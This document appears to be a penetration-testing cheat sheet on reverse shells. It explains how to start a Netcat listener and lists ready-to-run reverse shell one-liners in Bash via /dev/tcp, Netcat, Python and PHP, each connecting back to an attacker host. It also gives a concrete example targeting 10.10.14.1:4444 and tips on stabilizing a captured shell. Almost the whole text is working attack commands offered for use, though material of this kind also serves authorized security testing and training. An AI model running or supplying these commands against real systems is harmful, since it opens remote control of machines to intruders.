# Reverse Shells Cheat Sheet

## Overview

A reverse shell is a shell session initiated from the target machine back to an attacker-controlled listener, commonly used when direct inbound access to the target isn't available.

## Common Syntax

```bash
# On the attacker machine — start a listener first
nc -lvnp <port>
```

## Useful Commands

```bash
# Bash reverse shell
bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1

# Netcat reverse shell (traditional)
nc -e /bin/sh <attacker-ip> <port>

# Netcat reverse shell (no -e support)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker-ip> <port> > /tmp/f

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'

# PHP reverse shell
php -r '$sock=fsockopen("<attacker-ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Important Options

| Element | Description |
|---|---|
| `<attacker-ip>` | The IP address of the machine running the listener |
| `<port>` | The port the listener is bound to |
| `nc -lvnp <port>` | Starts a Netcat listener in verbose mode, without DNS resolution, on the specified port |

## Examples

```bash
# Attacker
nc -lvnp 4444

# Target
bash -i >& /dev/tcp/10.10.14.1/4444 0>&1
```

Starts a listener on the attacker machine, then triggers a Bash reverse shell from the target back to it.

## Common Mistakes

- Starting the payload before the listener is ready, missing the connection.
- Using an IP address unreachable from the target (e.g., a loopback or internal-only address instead of the correct attacking interface's IP).
- Forgetting shell stabilization steps (e.g., `python3 -c 'import pty; pty.spawn("/bin/bash")'`) after landing a raw shell, leading to a fragile, non-interactive session.

## References

- [PayloadsAllTheThings – Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

## Key Takeaways

- Always start the listener before executing the reverse shell payload.
- Have multiple shell payload types ready (Bash, Python, PHP, Netcat) since target environments vary in what interpreters/binaries are available.
